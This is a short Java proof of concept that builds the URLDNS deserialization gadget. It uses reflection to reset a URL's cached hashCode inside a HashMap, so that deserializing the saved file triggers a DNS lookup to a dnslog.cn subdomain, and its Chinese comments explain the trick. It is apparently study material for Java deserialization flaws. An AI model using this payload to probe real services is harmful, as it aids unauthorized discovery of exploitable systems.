import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS1 {
    public static void main(String[] args) throws Exception {
        HashMap<URL,Integer> hashMap = new HashMap<>();
        URL url = new URL("http://urldns1.lszr1d.dnslog.cn");
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        //设置HashCode防止put时请求dns
        f.set(url,0x01010101);
        hashMap.put(url,0);
        //修改hashCode为默认值为-1保证后续触发
        f.set(url,-1);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("urldns1.bin"));
        objectOutputStream.writeObject(hashMap);

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("urldns1.bin"));
        objectInputStream.readObject();
    }
}
